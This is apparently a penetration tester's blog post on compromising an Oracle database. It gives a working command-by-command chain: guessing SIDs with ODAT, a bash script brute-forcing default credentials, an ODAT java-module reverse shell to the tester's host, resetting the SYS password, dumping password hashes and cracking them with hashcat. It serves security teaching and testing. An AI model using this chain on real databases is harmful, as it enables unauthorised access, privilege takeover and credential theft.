---
layout: post
title: "Hacking Oracle in 2021"
tags: oracle database 
---

I recently came across an Oracle database on an internal pen test and learned some new techniques which I thought I would share. This blog shows the process and path I used to compromise the database during my engagement. 

Once a host has been found that is running Oracle the first step was to try and discover any SIDs using [ODAT] [ODAT]. ODAT is an open source tool designed to attack Oracle Database servers.

`odat sidguesser -s <ip>`

![Odat SID Guesser]({{site.baseurl}}/assets/img/2021-11-26/odatSid.png)

Now that we have found a valid SID, lets try and find some valid credentials. The following brute force script [here] [oracleBrute] was used to get default credentials. Brute force can also be done via the metasploit module "oracle_login".

```bash
#!/bin/bash
INPUT=/tmp/oracle_defaults.csv
OLDIFS=$IFS
IFS=,
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
while read comment number username password hash comment
do
 echo "string = $username:$password"
 sqlplus -L $username\/$password\@172.17.0.3:1521\/XE
done < $INPUT
IFS=$OLDIFS
```

It should be noted that not all default credentials are in the metasploit wordlist. A better list can be found [here] [SecListOracle]. In this case the default credentials CTXSYS:CTXSYS worked.

![Oracle Brute Force]({{site.baseurl}}/assets/img/2021-11-26/oracleBrute.png)

Now we have access to the database lets run the ODAT module 'all' which will run all modules to see if we can get command execution.  

`odat all -s <ip> -U CTXSYS -P CTXSYS -d XE`

![ODAT All]({{site.baseurl}}/assets/img/2021-11-26/odatAll.png)

From the output above we can see various options but the one which stands out is the JAVA library. This module can allow us to get code execution using 'java stored' procedure (I won't go into detail here as this attack vector has been covered many times before). We can now use ODAT to return a reverse shell by using this java module in ODAT. 

`odat java -s <target IP> -U CTXSYS -P CTXSYS -d XE --reverse-shell <local IP> <port>`


![ODAT]({{site.baseurl}}/assets/img/2021-11-26/odatJava.png)


From the reverse shell we can connect to the database as a sysdba and once connected we can grant our account sysdba privileges. This example shows a quick change to the SYS user password just for ease in the lab environment but this way is not recommended during a real engagement.

Connect to the database and change the password:

`/opt/oracle/product/18c/dbhomeXE/bin/sqlplus / as sysdba`

`ALTER USER SYS IDENTIFIED BY SYS;`


![SYSDBA]({{site.baseurl}}/assets/img/2021-11-26/sysdba.png)

Now we know the SYS password we can dump the database credentials with ODAT.

`odat passwordstealer -s <ip> --sysdba -U SYS -P SYS -d XE --get-passwords `

![ODAT Password Dump]({{site.baseurl}}/assets/img/2021-11-26/odatPasswordDump.png)

Export the passwords into a file but remove most of the values and just keep the T value to pass it into hashcat for cracking. 

`sed 's/.*://' oracle.hashes | tee oracle.hashcat`

![Oracle Hashes]({{site.baseurl}}/assets/img/2021-11-26/oracleHashes.png)

Crack the hashes from the ODAT dump. 

`hashcat -m 12300 oracle.hashcat wordlist.txt --force`

![Oracle Cracked]({{site.baseurl}}/assets/img/2021-11-26/oracleCracked.png)


### Links & Resources


tools


* <https://hashcat.net/wiki/doku.php?id=example_hashes>{:target="_blank"}
* <http://marcel.vandewaters.nl/oracle/security/password-hashes>{:target="_blank"}
* <https://javamana.com/2021/07/20210729124711510t.html>{:target="_blank"}
* <https://seanstuber.com/how-oracle-stores-passwords/>{:target="_blank"}



[ODAT]: https://github.com/quentinhardy/odat
[oracleBrute]: https://blog.carnal0wnage.com/2014/10/quick-and-dirty-oracle-brute-forcing.html
[SecListOracle]: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt